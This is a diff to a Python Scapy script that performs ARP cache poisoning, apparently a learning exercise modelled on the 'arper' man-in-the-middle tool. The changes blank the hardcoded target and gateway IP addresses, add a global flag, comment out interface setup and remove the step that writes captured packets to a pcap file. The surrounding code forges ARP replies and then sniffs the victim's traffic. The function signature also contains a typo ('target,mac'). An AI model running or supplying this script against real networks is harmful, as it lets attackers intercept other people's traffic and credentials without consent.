@@ -5,8 +5,8 @@ import threading
 import signal
 
 interface = "en0"
-target_ip = "10.0.67.98"
-gateway_ip = "10.0.67.1"
+target_ip = ""
+gateway_ip = ""
 packet_count = 1000
 poisoning = True
 
@@ -36,6 +36,7 @@ def get_mac(ip_address):
     return None
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target,mac):
+    global poisoning
     
     poison_target = ARP()
     poison_target.op = 2
@@ -69,7 +70,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target,mac):
     return
 
 # Setup our interface
-conf.iface = interface
+#conf.iface = interface
 
 # Turn off output
 conf.verb = 0
@@ -110,8 +111,6 @@ try:
 
     bpf_filter = "ip host %s" % target_ip
     packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)
-    # Write out the captured packets
-    wrpcap("arper.pcap", packets)
 
     # Restore the network
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
